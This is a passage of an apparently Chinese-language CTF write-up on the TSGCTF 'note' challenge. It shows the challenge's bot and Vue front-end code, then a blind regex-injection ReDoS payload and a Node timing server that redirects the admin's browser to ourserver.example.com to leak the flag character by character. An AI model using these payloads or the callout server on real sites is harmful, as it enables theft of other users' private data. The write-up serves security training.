&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`[*] started: <span class="subst">$&#123;url&#125;</span>`</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> browser = <span class="keyword">await</span> puppeteer.launch(browser_option);</span><br><span class="line">    <span class="keyword">const</span> page = <span class="keyword">await</span> browser.newPage();</span><br><span class="line">    <span class="keyword">await</span> page.setCookie(&#123;</span><br><span class="line">        name: <span class="string">'rack.session'</span>,</span><br><span class="line">        value: process.env.COOKIE_VALUE,</span><br><span class="line">        domain: process.env.DOMAIN,</span><br><span class="line">        expires: <span class="built_in">Date</span>.now() / <span class="number">1000</span> + <span class="number">10</span>,</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> resp = <span class="keyword">await</span> page.goto(url, &#123;</span><br><span class="line">            waitUntil: <span class="string">'load'</span>,</span><br><span class="line">            timeout: <span class="number">3000</span>,</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (err)&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(err);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">await</span> page.close();</span><br><span class="line">    <span class="keyword">await</span> browser.close();</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`[*] finished: <span class="subst">$&#123;url&#125;</span>`</span>)</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// handle the whole</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">handle</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"[*] waiting new query ..."</span>)</span><br><span class="line">    connection.blpop(<span class="string">"query"</span>, <span class="number">0</span>, <span class="keyword">async</span> <span class="function"><span class="keyword">function</span>(<span class="params">err, message</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">const</span> url = message[<span class="number">1</span>];</span><br><span class="line">        <span class="keyword">await</span> crawl(url);</span><br><span class="line">        <span class="keyword">await</span> connection.incr(<span class="string">"proceeded_count"</span>);</span><br><span class="line">        setTimeout(handle, <span class="number">10</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line">handle();</span><br></pre></td></tr></table></figure>

<ul>
<li>app.rb中flag被放到了管理员的note中</li>
<li>给了一个worker.js</li>
<li>前端有一个Report URL</li>
</ul>
<p>根据这三点可以猜到是一个xss的题，看下前端的代码，发现是用vue.js写的</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!doctype <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"icon"</span> <span class="attr">href</span>=<span class="string">"data:,"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"https://cdnjs.cloudflare.com/ajax/libs/meyer-reset/2.0/reset.min.css"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"https://cdnjs.cloudflare.com/ajax/libs/bulma/0.9.0/css/bulma.min.css"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span> <span class="attr">defer</span> <span class="attr">src</span>=<span class="string">"https://use.fontawesome.com/releases/v5.3.1/js/all.js"</span> <span class="attr">crossorigin</span>=<span class="string">"anonymous"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://cdn.jsdelivr.net/npm/vue"</span> <span class="attr">crossorigin</span>=<span class="string">"anonymous"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"/app.css"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="css"><span class="selector-attr">[v-cloak]</span>&gt;*&#123;<span class="attribute">display</span>: none&#125; <span class="selector-attr">[v-cloak]</span><span class="selector-pseudo">::before</span>&#123;<span class="attribute">content</span>:<span class="string">"loading..."</span>&#125;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span> <span class="attr">v-cloak</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"container"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">v-if</span>=<span class="string">"headerImg"</span> <span class="attr">class</span>=<span class="string">"hero"</span>&gt;</span> <span class="tag">&lt;<span class="name">img</span> <span class="attr">:src</span>=<span class="string">"headerImg"</span> /&gt;</span> <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">                <span class="tag">&lt;<span class="name">section</span> <span class="attr">class</span>=<span class="string">"section"</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">v-if</span>=<span class="string">"loggedin"</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"buttons is-right"</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">button</span> <span class="attr">v-on:click</span>=<span class="string">"logout"</span> <span class="attr">class</span>=<span class="string">"button"</span>&gt;</span>Exit Note Space<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"/report.html"</span> <span class="attr">class</span>=<span class="string">"button"</span>&gt;</span>Report URL<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">                        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"control"</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"control has-icons-right"</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">input</span> <span class="attr">v-model</span>=<span class="string">"search"</span> <span class="attr">placeholder</span>=<span class="string">"Search..."</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">class</span>=<span class="string">"input is-rounded"</span> /&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"icon is-small is-right"</span>&gt;</span><span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">"fas fa-search"</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">                        <span class="tag">&lt;<span class="name">section</span> <span class="attr">class</span>=<span class="string">"section"</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"is-centered"</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"control note is-centered"</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">textarea</span> <span class="attr">v-model</span>=<span class="string">"editingNote"</span> <span class="attr">placeholder</span>=<span class="string">"note..."</span> <span class="attr">class</span>=<span class="string">"textarea note-color box"</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">button</span> <span class="attr">v-on:click</span>=<span class="string">"postNote"</span> <span class="attr">class</span>=<span class="string">"button is-fullwidth"</span>&gt;</span>Post<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">section</span>&gt;</span></span><br><span class="line"></span><br><span class="line">                        <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"display: flex; flex-wrap: wrap;"</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">div</span> <span class="attr">v-for</span>=<span class="string">"note in visibleNotes"</span> <span class="attr">class</span>=<span class="string">"note note-color box"</span> <span class="attr">style</span>=<span class="string">"flex: 1"</span>&gt;</span></span><br><span class="line">                                &#123;&#123; note.content &#125;&#125;</span><br><span class="line">                                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"x-icon"</span> <span class="attr">:noteid</span>=<span class="string">"note.id"</span> <span class="attr">v-on:click</span>=<span class="string">"deleteNote"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">v-else</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">button</span> <span class="attr">v-on:click</span>=<span class="string">"register"</span> <span class="attr">class</span>=<span class="string">"button"</span>&gt;</span>New Note Space<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">section</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"/app.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">api</span>(<span class="params">path, body, method = <span class="string">'POST'</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> fetch(path, &#123;</span><br><span class="line">        method,</span><br><span class="line">        credentials: <span class="string">'include'</span>,</span><br><span class="line">        ...(method == <span class="string">'POST'</span> ? &#123;</span><br><span class="line">            headers: &#123;</span><br><span class="line">                <span class="string">'Content-Type'</span>: <span class="string">'application/json'</span>,</span><br><span class="line">            &#125;,</span><br><span class="line">            body: <span class="built_in">JSON</span>.stringify(body),</span><br><span class="line">        &#125; : &#123;&#125;),</span><br><span class="line">    &#125;).then(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(!res.ok) &#123;</span><br><span class="line">            <span class="keyword">return</span> res.json().catch(<span class="function"><span class="params">_</span> =&gt;</span> &#123;</span><br><span class="line">                <span class="keyword">throw</span> &#123;<span class="attr">message</span>: <span class="string">'something went wrong'</span>&#125;;</span><br><span class="line">            &#125;).then(<span class="function">(<span class="params">&#123;message&#125;</span>) =&gt;</span> &#123;</span><br><span class="line">                <span class="keyword">throw</span> &#123;<span class="attr">message</span>: message || <span class="string">'something went wrong'</span>&#125;;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = <span class="keyword">new</span> Vue(&#123;</span><br><span class="line">    el: <span class="string">'#app'</span>,</span><br><span class="line">    data: &#123;</span><br><span class="line">        tab: <span class="string">'transfer'</span>,</span><br><span class="line">        headerImg: <span class="built_in">document</span>.location.hash.substring(<span class="number">1</span>) || <span class="string">''</span>,</span><br><span class="line">        search: <span class="built_in">document</span>.location.search.substring(<span class="number">1</span>) || <span class="string">''</span>,</span><br><span class="line">        editingNote: <span class="string">''</span>,</span><br><span class="line">        allNotes: [],</span><br><span class="line">        visibleNotes: [],</span><br><span class="line">        loggedin: <span class="literal">false</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    watch: &#123;</span><br><span class="line">        search() &#123;</span><br><span class="line">            <span class="keyword">this</span>.updateVisibleNotes();</span><br><span class="line">        &#125;,</span><br><span class="line">        allNotes() &#123;</span><br><span class="line">            <span class="keyword">this</span>.updateVisibleNotes();</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="keyword">this</span>.allNotes.length);</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">    mounted() &#123;</span><br><span class="line">        <span class="keyword">this</span>.updateNotes();</span><br><span class="line">    &#125;,</span><br><span class="line">    methods: &#123;</span><br><span class="line">        <span class="keyword">async</span> updateNotes() &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">const</span> notes = <span class="keyword">await</span> (<span class="keyword">await</span> api(<span class="string">'/api/note'</span>, <span class="string">''</span>, <span class="string">'GET'</span>)).json();</span><br><span class="line">                <span class="keyword">this</span>.loggedin = <span class="literal">true</span>;</span><br><span class="line">                <span class="built_in">console</span>.log(notes);</span><br><span class="line">                <span class="keyword">this</span>.allNotes = notes;</span><br><span class="line">            &#125; <span class="keyword">catch</span> &#123;</span><br><span class="line">                <span class="keyword">this</span>.loggedin = <span class="literal">false</span></span><br><span class="line">                <span class="keyword">this</span>.allNotes = [];</span><br><span class="line">            &#125;;</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="keyword">async</span> updateVisibleNotes() &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">const</span> re = <span class="keyword">new</span> <span class="built_in">RegExp</span>(<span class="keyword">this</span>.search);</span><br><span class="line">                <span class="keyword">this</span>.visibleNotes = <span class="keyword">this</span>.allNotes.filter(<span class="function">(<span class="params">&#123;content&#125;</span>) =&gt;</span> content.match(re));</span><br><span class="line">            &#125; <span class="keyword">catch</span> &#123;</span><br><span class="line">                <span class="comment">// pass</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="keyword">async</span> register() &#123;</span><br><span class="line">            <span class="keyword">await</span> api(<span class="string">'/api/register'</span>, &#123;&#125;);</span><br><span class="line">            <span class="keyword">await</span> <span class="keyword">this</span>.updateNotes();</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="keyword">async</span> logout() &#123;</span><br><span class="line">            <span class="keyword">await</span> api(<span class="string">'/api/logout'</span>, &#123;&#125;)</span><br><span class="line">            <span class="keyword">this</span>.updateNotes();</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="keyword">async</span> postNote() &#123;</span><br><span class="line">            <span class="keyword">await</span> api(<span class="string">'/api/note'</span>, &#123;<span class="attr">note</span>: <span class="keyword">this</span>.editingNote&#125;);</span><br><span class="line">            <span class="keyword">this</span>.editingNote = <span class="string">''</span>;</span><br><span class="line">            <span class="keyword">const</span> notes = <span class="keyword">await</span> (<span class="keyword">await</span> api(<span class="string">'/api/note'</span>, <span class="string">''</span>, <span class="string">'GET'</span>)).json();</span><br><span class="line">            <span class="keyword">this</span>.allNotes = notes;</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="keyword">async</span> deleteNote(ev) &#123;</span><br><span class="line">            <span class="keyword">const</span> e = ev.target;</span><br><span class="line">            <span class="keyword">const</span> noteid = e.getAttribute(<span class="string">'noteid'</span>);</span><br><span class="line">            <span class="keyword">await</span> api(<span class="string">`/api/note/<span class="subst">$&#123;noteid&#125;</span>`</span>, &#123;&#125;, <span class="string">'DELETE'</span>);</span><br><span class="line">            <span class="keyword">const</span> notes = <span class="keyword">await</span> (<span class="keyword">await</span> api(<span class="string">'/api/note'</span>, <span class="string">''</span>, <span class="string">'GET'</span>)).json();</span><br><span class="line">            <span class="keyword">this</span>.allNotes = notes;</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<h3 id="正则注入"><a href="#正则注入" class="headerlink" title="正则注入"></a>正则注入</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> updateVisibleNotes() &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> re = <span class="keyword">new</span> <span class="built_in">RegExp</span>(<span class="keyword">this</span>.search);</span><br><span class="line">        <span class="keyword">this</span>.visibleNotes = <span class="keyword">this</span>.allNotes.filter(<span class="function">(<span class="params">&#123;content&#125;</span>) =&gt;</span> content.match(re));</span><br><span class="line">    &#125; <span class="keyword">catch</span> &#123;</span><br><span class="line">        <span class="comment">// pass</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到这里存在一个正则注入，注入的正则用于匹配note的内容，并且<code>this.search</code>可以由url控制</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search: <span class="built_in">document</span>.location.search.substring(<span class="number">1</span>) || <span class="string">''</span>,</span><br></pre></td></tr></table></figure>

<p>javascript的正则并不像php那样有回溯次数的限制，因此正则注入能够造成ReDos</p>
<p>通过注入特殊的正则，可以根据延时的不同判断note的内容，详细可以参考<a href="https://diary.shift-js.info/blind-regular-expression-injection/" target="_blank" rel="noopener">https://diary.shift-js.info/blind-regular-expression-injection/</a></p>
<p>比如以下正则</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">^(?&#x3D;&#123;some regexp here&#125;)((((.*)*)*)*)*salt</span><br></pre></td></tr></table></figure>

<ul>
<li><code>salt</code>是一个有一定长度的字符串，比如随便填一个<code>saltfwefwefewfwfekorewp</code></li>
<li><code>((((.*)*)*)*)*salt</code>这部分通过嵌套重复运算符导致回溯次数暴增，造成ReDos，比如</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">regex = <span class="string">"((((.*)*)*)*)*saltfwefwefewfwfekorewp"</span>;</span><br><span class="line"><span class="keyword">const</span> re = <span class="keyword">new</span> <span class="built_in">RegExp</span>(regex);</span><br><span class="line"><span class="string">'abcdefghijklmnopq'</span>.match(re); <span class="comment">//会卡在这</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'finish'</span>)</span><br></pre></td></tr></table></figure>

<p>详细的理论可以参见<a href="https://zhuanlan.zhihu.com/p/46294360" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/46294360</a>，虽然我没看懂…</p>
<ul>
<li><code>^(?={some regexp here})</code> 正向肯定预查<ul>
<li>如果目标字符串无法匹配<code>some regexp here</code>的话就直接返回匹配失败，这样就不会运行后面的<code>((((.*)*)*)*)*salt</code>，也就不会有延时</li>
<li>匹配<code>some regexp here</code>的话就会reDos</li>
</ul>
</li>
</ul>
<p>通过改变<code>some regexp here</code>，根据延时的不同就可以判断出note的内容</p>
<p>比如我随便输了一个内容为<code>aaaTSGCTF{Abdfefe</code>的note，访问以下url<br><a href="http://35.221.81.216:18364/?^(?=^aaa)((((.*)*)*)*)*saltfwefwefewfwfekorewp" target="_blank" rel="noopener">http://35.221.81.216:18364/?^(?=^aaa)((((.*)*)*)*)*saltfwefwefewfwfekorewp</a></p>
<p><img src="/images/TSGCTF_note_2.JPG" alt=""></p>
<ul>
<li>firefox会卡在这个页面大概8秒左右（我瞎数的）才显示出搜索栏和note的文本框，调试可以发现是firefox在一定时间后强行跳过了正则匹配那行</li>
<li>chrome会卡更久时间，直到提示说该页面无响应</li>
</ul>
<h3 id="OOB"><a href="#OOB" class="headerlink" title="OOB"></a>OOB</h3><p>那么把这样的url发给管理员后，怎样才知道它延时了多久呢</p>
<p>可以注意到有一个根据<code>location.document.hash</code>加载背景图片的功能</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">headerImg: <span class="built_in">document</span>.location.hash.substring(<span class="number">1</span>) || <span class="string">''</span>,</span><br></pre></td></tr></table></figure>

<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">v-if</span>=<span class="string">"headerImg"</span> <span class="attr">class</span>=<span class="string">"hero"</span>&gt;</span> <span class="tag">&lt;<span class="name">img</span> <span class="attr">:src</span>=<span class="string">"headerImg"</span> /&gt;</span> <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>看起来可以通过加载我们服务器上的图片来看延时了多久，然而加载图片是发生在正则匹配之前的…</p>
<p>解决方法是通过加载图片时的延时和302跳转，方法和代码来自<a href="https://ctftime.org/writeup/22284" target="_blank" rel="noopener">https://ctftime.org/writeup/22284</a></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> http = <span class="built_in">require</span>(<span class="string">'http'</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; performance &#125; = <span class="built_in">require</span>(<span class="string">'perf_hooks'</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; URL &#125; = <span class="built_in">require</span>(<span class="string">'url'</span>);</span><br><span class="line"><span class="keyword">const</span> server = http.createServer(<span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    res.writeHead(<span class="number">302</span>, &#123;</span><br><span class="line">      <span class="string">'Location'</span>: <span class="string">'http://ourserver.example.com:8001/?r='</span> + <span class="built_in">encodeURIComponent</span>(req.headers.referer) + <span class="string">'&amp;s='</span> + <span class="built_in">encodeURIComponent</span>(performance.now())</span><br><span class="line">    &#125;);</span><br><span class="line">    res.end();</span><br><span class="line">  &#125;, <span class="number">2000</span>);</span><br><span class="line">&#125;);</span><br><span class="line">server.listen(<span class="number">8000</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> server2 = http.createServer(<span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> url = <span class="keyword">new</span> URL(req.url, <span class="string">'http://ourserver.example.com:8001'</span>);</span><br><span class="line">  <span class="built_in">console</span>.log(url.searchParams.get(<span class="string">'r'</span>));</span><br><span class="line">  <span class="built_in">console</span>.log(performance.now() - <span class="built_in">parseInt</span>(url.searchParams.get(<span class="string">'s'</span>)));</span><br><span class="line">  res.writeHead(<span class="number">200</span>, &#123;<span class="string">'Content-Type'</span>: <span class="string">'text/plain'</span>&#125;);</span><br><span class="line">  res.end(<span class="string">'ok\n'</span>);</span><br><span class="line">&#125;);</span><br><span class="line">server2.listen(<span class="number">8001</span>);</span><br></pre></td></tr></table></figure>

<p>访问<br><a href="http://35.221.81.216:18364/?^(?=aaa)((((.*)*)*)*)*saltfwefwefewfwfekorewp#http://ourserver.example.com:8000" target="_blank" rel="noopener">http://35.221.81.216:18364/?^(?=aaa)((((.*)*)*)*)*saltfwefwefewfwfekorewp#http://ourserver.example.com:8000</a>，这时浏览器会做下面的操作：</p>
<ul>
<li>新开一个线程去加载图片，该线程经过了我们服务器两秒的延时后才拿到302跳转的返回，向主线程发出自己工作完成的信号</li>
<li>在这个期间主线程继续往下执行其他的代码<ul>
<li>如果note内容不匹配<code>some regexp here</code>的话主线程就会继续往下干活，及时处理加载图片线程的信号，在较短的时间内请求8001端口</li>
<li>如果note的内容匹配<code>some regexp here</code>的话，主线程会卡死在正则匹配这里。不请求8001端口或者晚请求8001端口</li>
</ul>
</li>
</ul>
<p>上面的过程都是我瞎猜的…</p>
<p>不断改变<code>some regexp here</code>，通过请求8000端口和请求8001端口的时间差就可以判断flag的内容了</p>
<p>试验一下可以发现虽然worker.js里写的是firefox，但是Report URL在ReDos成功后根本不会有第二次请求…反倒是和chrome表现一致…</p>
<p>瞎捣鼓了一个很慢的exp：</p>
<ul>
<li>server.js</li>
</ul>
